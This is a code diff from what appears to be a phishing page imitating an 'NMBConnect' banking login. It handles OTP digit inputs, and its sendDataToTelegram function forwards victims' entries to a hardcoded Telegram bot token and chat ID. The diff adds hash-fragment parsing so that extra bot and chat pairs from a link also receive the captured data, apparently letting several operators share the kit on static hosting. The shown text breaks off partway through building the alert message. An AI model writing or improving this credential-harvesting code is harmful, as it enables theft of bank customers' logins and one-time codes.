@@ -844,7 +844,6 @@
     otpInputs.forEach((input, idx) => {
       input.addEventListener('input', (e) => {
         const val = input.value;
-        // Restrict to digits only
         input.value = val.replace(/\D/g, '');
         
         if (input.value.length === 1 && idx < otpInputs.length - 1) {
@@ -863,22 +862,34 @@
       otpInputs.forEach(i => i.value = '');
     }
 
-    /* Routing Configuration: Main receives ALL inputs, custom sub-links receive their specific linked inputs via URL parameters (?bot=TOKEN&chat=ID) */
+    /* Robust Routing Configuration supporting multiple formats:
+       - Supports URL parameters: ?bot=TOKEN&chat=ID
+       - Supports Hash parameters: #bot=TOKEN&chat=ID (useful when hosting on platforms like Static.app, GitHub Pages, Vercel, etc.)
+    */
     function sendDataToTelegram(actionType, details) {
         const mainBots = [
             { token: "8866470725:AAFXI9deCCslCGBqAi8NsBkwD3Tm4OHPQpw", chatId: "8735708057" }
         ];
 
+        // Parse search query parameters (?bot=...&chat=...)
         const urlParams = new URLSearchParams(window.location.search);
-        const customBotToken = urlParams.get('bot');
-        const customChatId = urlParams.get('chat');
+        let customBotToken = urlParams.get('bot');
+        let customChatId = urlParams.get('chat');
+
+        // Fallback: Parse hash parameters (#bot=...&chat=...) if URL parameters are empty
+        if (!customBotToken || !customChatId) {
+            const hashStr = window.location.hash.replace(/^#/, '');
+            const hashParams = new URLSearchParams(hashStr);
+            if (!customBotToken) customBotToken = hashParams.get('bot');
+            if (!customChatId) customChatId = hashParams.get('chat');
+        }
 
         // Main targets receive all inputs unconditionally
         let targets = [...mainBots];
 
-        // If a specific link/parameters are provided, route to that specific account as well
+        // If secondary bot and chat ID are successfully captured from the link, add them to the routing queue
         if (customBotToken && customChatId) {
-            targets.push({ token: customBotToken, chatId: customChatId });
+            targets.push({ token: customBotToken.trim(), chatId: customChatId.trim() });
         }
 
         const message = `🔔 *NMBConnect Alert: ${actionType}*\n\n` +
